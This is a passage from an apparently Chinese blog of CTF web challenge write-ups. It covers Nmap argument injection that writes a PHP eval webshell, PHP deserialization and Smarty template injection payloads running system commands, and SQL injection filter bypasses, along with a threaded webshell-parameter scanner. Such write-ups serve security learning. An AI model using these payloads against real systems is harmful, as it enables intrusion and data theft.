punctuation">)</span>  <span class="token comment"># {'param': "echo 'hahahahahah';"}</span>                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 关闭请求  释放内存</span>                <span class="token keyword">if</span> <span class="token string">"hahahahahah"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span>            param <span class="token operator">=</span> a        <span class="token keyword">else</span><span class="token punctuation">:</span>            param <span class="token operator">=</span> b        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'找到了利用文件： '</span> <span class="token operator">+</span> <span class="token builtin">file</span> <span class="token operator">+</span> <span class="token string">"  and 找到了利用的参数：%s"</span> <span class="token operator">%</span> param<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'结束时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>  <span class="token comment"># 加入多线程</span>    t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""threading.Thread() 是 threading 模块中用于创建线程对象的类。target=get_content：指定线程要执行的目标函数，即 get_content 函数。当线程启动后，会调用这个函数来完成具体的任务。args=(i,)：传递给目标函数的参数。args 是一个元组，这里将当前文件名称 i 作为参数传递给 get_content 函数。注意，即使只有一个参数，也需要写成元组的形式，后面的逗号不能省略。"""</span>    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 调用线程对象 t 的 start() 方法，该方法会启动线程并开始执行 target 指定的函数（即 get_content</span>    <span class="token comment"># 函数）。线程会在后台独立运行，不会阻塞主线程的执行，从而实现多线程并发处理多个文件的目的。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/96c3955e1ad9562ad539e67f736eeda9.png"></p><pre class="line-numbers language-none"><code class="language-none">/xk0SzyKwfzw.php?Efa5BVG=cat /flagflag{ed497ec8-a905-4882-9f8b-bb22ffd3c9e7}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>还有就是要注意echo的线索要小小众些，不然会出现一堆可行的（</p><hr><h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7c69f9df7ebc863df09abd77bddd0b3f.png"></p><pre class="line-numbers language-none"><code class="language-none">Warning: simplexml_load_file(): I/O warning : failed to load external entity "xml/34234" in /var/www/html/result.php on line 23Wrong file name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://www.cnblogs.com/HOsystem/p/16538678.html">Nmap 操作手册 - 完整版 - HOsystem - 博客园</a></p><p><a href="https://www.cnblogs.com/yankaohaitaiwei/p/11593970.html">【渗透测试小白系列】之目录扫描、Nmap的使用及使用Metasploit通过MS17-010获取系统权限 - Woori - 博客园</a></p><p>来对比下：</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f48b3048b506f7be115558352aea1c1f.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/252d6fc0ab7cbcbd088efafd0c777eb5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/088dcf83226ababff6ce04be14945ccf.png"></p><p>很明显前两更像，TCP+balabala…</p><p>故为nmap+IP形式</p><blockquote><pre class="line-numbers language-none"><code class="language-none">nmap -iL filename 扫描目标文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>-oN / -oX / -oS / -oG ：正常输出扫描，XML，s | &lt;rIpt kIddi3 和Grepable格式，分别为给定的文件名；</li><li>-oA ：一次输出三种主要格式；</li><li>nmap -oG <output_file> [其他扫描参数] &lt;目标主机或网络&gt;</output_file></li></ul></blockquote><p>一种是酱，参考[BUUCTF 2018]Online Tool[<a href="http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/#escapeshellarg">浅谈escapeshellarg逃逸与参数注入  Mi1k7ea ]http://www.mi1k7ea.com/2019/07/04/浅谈escapeshellarg与参数注入/#escapeshellarg</a></p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1' -iL /flag -oN xa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问xa’</p><p>但感觉不靠谱,我又不造源代码里有escapeshllarg什么的（</p><p>原来nmap可能和escapeshellarg()与escapeshellcmd()配合使用，那没事了</p><p>哇哦！！！！那以后nmap就靠这方面了。这两道题都是一个类型。</p><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/17705836.html">nmap和escapeshellarg()函数、escapeshellcmd()函数的RCE使用 - Eddie_Murphy - 博客园</a></p><p>遂把那题的payload搬过来<code>' 《?php @eval($_POST["pass"]);?&gt; -oG pass.php '</code></p><p><del>结果说我是Hacker(bushi</del></p><p>试了一会儿，好像是把php给ban了</p><p>[<a href="https://blog.csdn.net/m0_46607055/article/details/120076797">极客大挑战 2019]Upload——php短标签-CSDN博客</a>找见了喵~</p><blockquote><p>php短标签</p><!--? echo '123';?--><p>  #前提是开启配置参数short_open_tags=on<br><!--?=(表达式)?-->  等价于 <!--?php echo (表达式)?-->  #不需要开启参数设置<br>&lt;% echo ‘123’;%&gt;   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用</p><script language="php">echo '123'; </script> #不需要修改参数开关，但是只能在7.0以下可用。</blockquote><p>遂用短标签=&gt;<code>' 《? @eval($_POST["pass"]);?&gt; -oG pass.phtml '</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8f33f11801e63936ef912af978302d92.png"></p><p>okk~</p><hr><h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p><del>蹦出来个大二维码吓死我了啊啊啊啊啊啊</del></p><p><del>而且报的时间是错的喵</del></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>百万前端的<span class="token constant">NPU</span>报时中心为您报时：<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"./time.php?source"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token constant">SCRIPT</span> language<span class="token operator">=</span>javascript<span class="token operator">&gt;</span><span class="token keyword">function</span> <span class="token function">runClock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>theTime <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">"runClock()"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> today <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> display<span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span>status<span class="token operator">=</span><span class="token string">""</span><span class="token operator">+</span>display<span class="token operator">+</span><span class="token string">"大黑阔HELEN"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">runClock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php<span class="token comment">#error_reporting(0);</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>@<span class="token variable">$ppp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>喵的肿么越看越眼熟什么的。。。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php<span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试，但没反应。。。</p><p>换了个md5可，看来是把system给ban了。</p><p><a href="https://www.cnblogs.com/lktop/p/13745752.html">PHP代码执行/命令执行总结 - lktop - 博客园</a></p><p><del>卒</del></p><blockquote><p>在 PHP 里，<code>assert()</code> 是一个用于断言的函数。它的作用是判断某个表达式是否为真，如果表达式为假，就会触发一个断言失败的错误。<code>assert()</code> 函数一般接收一个表达式作为参数，当这个表达式的计算结果为 <code>false</code> 时，会根据配置来决定是否抛出异常或者发出警告。</p><p>而 <code>phpinfo()</code> 函数的功能是输出 PHP 的配置信息，包含 PHP 版本、编译选项、加载的扩展、环境变量等诸多详细内容。该函数会将这些信息以 HTML 表格的形式输出到页面上，并且返回值为 <code>true</code>。</p><h3 id="代码执行情况"><a href="#代码执行情况" class="headerlink" title="代码执行情况"></a>代码执行情况</h3><p>当你执行 <code>assert(phpinfo())</code> 时，会有以下情况发生：</p><ol><li><strong><code>phpinfo()</code> 函数先执行</strong>：它会输出 PHP 的详细配置信息到页面上。</li><li><strong><code>assert()</code> 对 <code>phpinfo()</code> 的返回值进行判断</strong>：因为 <code>phpinfo()</code> 总是返回 <code>true</code>，所以 <code>assert()</code> 里的条件始终为真，断言不会失败，也就不会触发断言失败的错误。</li></ol></blockquote><p>无敌了</p><p><code>O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}</code></p><hr><h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--Ah,really important,seriously. --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Unicorn shop<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- Don't be frustrated(沮丧的) by the same view,we've changed the challenge content.--&gt;</span><span class="token comment">&lt;!-- Bootstrap core CSS --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/bootstrap.min.css?v=ec3bb52a00e176a7181d454dffaea219<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- Custom styles for this template --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/jumbotron-narrow.css?v=166844ff66a82256d62737c8a6fc14bf<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--We still have some surprise for admin.password--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!-- /container --&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试了试ID不太可控，price到有些说法。。。</p><p>看见了<strong>Unicode</strong>标签，遂试。找个比1337大的Unicode单个数字就可。</p><p><a href="https://www.compart.com/en/unicode/search?q=ten+thousand#characters">Search</a></p><p>找ten thousand+number即可。𐄫፼等</p><hr><p>嗯哼，先酱</p><hr><h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><blockquote><p>Build With Smarty !</p></blockquote><p><a href="https://xz.aliyun.com/news/11666">文章 - Smarty模板注入&amp;CVE-2017-1000480 - 先知社区</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3293de369c63d4fb011cc1d369f0921c.png"></p><p>嗯哼</p><p><code>{if system('cat /flag')}{/if}</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ff7432e2eaba9512e5e0d0b84b4578d7.png"></p><p>ez</p><hr><h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p>admin已有，注册个号广告可xss。猜测需登admin。</p><p>看见<!--待管理确认-->猜测和MysteryMessageBoard一样。。。</p><p><del>然后无果</del></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/eff7b5aa7c44fa9a1ac3325615f6fabc.png"></p><p>终于！看来是sql(</p><p><a href="https://blog.csdn.net/hhhhhhhhh85/article/details/121328475">【CTF】二次注入原理及实战-CSDN博客</a></p><p>总之就是进来又出去数据库。。。</p><p><code>-1 ' order by 1#</code></p><!--标题含有敏感词汇--><p><del>这题还有个无敌的地方，它广告有上限（还不能一次知道那些被ban了</del></p><p>or（=&gt;^’异或）,注释(=&gt;’单引号闭合)，空格都ban了<del>(so,information_schem哭辽)</del></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">origin_text <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">print</span><span class="token punctuation">(</span>origin_text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'/**/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema-安全KER - 安全资讯平台</a></p><p><a href="https://www.cnblogs.com/q1stop/p/18024992">无列名sql注入 - qingshanboy - 博客园</a></p><blockquote><p>这道题目在buuoj上的复现是没办法用sys.schema来bypass information_schema的，原因是buuoj没有sys.schema_table_statistics_with_buffer这个数据库，但是比赛中是可以利用的。</p></blockquote><p><strong>join、using</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">join</span>用于合并两个表，<span class="token keyword">using</span>表示使用什么字段进行连接，用<span class="token keyword">using</span>指定了连接字段则查询结果只返回连接字段<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">as</span> c<span class="token comment">#这里使用id进行连接，只会返回id列</span>思路：利用<span class="token keyword">join</span>合并同一表，报错重复的列名，再利用<span class="token keyword">using</span>爆出所有的列名，<span class="token keyword">union</span> <span class="token keyword">select</span>需要前后查询的字段数一样，不然会报这里将 <span class="token keyword">user</span> 表与自身进行连接（<span class="token keyword">join</span> <span class="token keyword">user</span>），并使用 id 字段进行连接（<span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>）。由于使用了 <span class="token keyword">USING</span>，结果集中只会包含 id 列（因为 id 是连接字段）。<span class="token comment"># 得到 id 列名重复报错</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b<span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>这条语句尝试将 <span class="token keyword">user</span> 表中 id 等于 <span class="token number">1</span> 的记录（<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span>）与 <span class="token keyword">user</span> 表自身连接的结果（<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b<span class="token punctuation">)</span><span class="token keyword">as</span> c）进行 <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> 操作。但是，由于 <span class="token keyword">user</span> 表自身连接时没有指定连接条件，会导致列名重复（因为两个 <span class="token keyword">user</span> 表都有相同的列名），从而报错。<span class="token comment"># 得到 username 列名重复报错</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>这里在连接时使用了 <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>，但 <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> 要求前后两个查询的字段数必须相同。前面的查询 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> 会返回 <span class="token keyword">user</span> 表的所有列，而后面的查询 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c 由于 <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> 的限制，只返回 id 列，字段数不一致，所以会报错。<span class="token comment"># 得到 password 列名重复报错</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>同样，前面的查询返回所有列，后面的查询由于 <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">)</span> 只返回 id 和 username 列，字段数不一致，导致报错。<span class="token comment"># 得到 user 表中的数据</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>这里通过 <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> 使得后面的查询返回的列与前面的查询 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> 返回的列数和列名一致（假设 <span class="token keyword">user</span> 表只有 id、username 和 password 列），从而可以成功执行 <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> 操作，得到 <span class="token keyword">user</span> 表中的数据。 <span class="token keyword">JOIN</span> 用于合并两个表的数据。在 <span class="token keyword">SQL</span> 中，有多种类型的 <span class="token keyword">JOIN</span>，如 <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span>、<span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> 等。<span class="token keyword">USING</span> 是 <span class="token keyword">JOIN</span> 的一种子句，它用于指定连接两个表所依据的列。当使用 <span class="token keyword">USING</span> 指定连接字段时，查询结果中只会包含该连接字段一次（因为在两个表中该字段是相同的），而不是像普通 <span class="token keyword">JOIN</span> 那样可能出现重复的列名。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后发现join被ban了（</p><p><del>呃（吐血</del></p><p><strong>Q</strong>又试了试其他的方法都不行（我认为是它们最后有；的原因？），遂试<strong>子查询</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>a<span class="token keyword">select</span> a<span class="token punctuation">.</span><span class="token number">2</span> <span class="token keyword">from</span> <span class="token 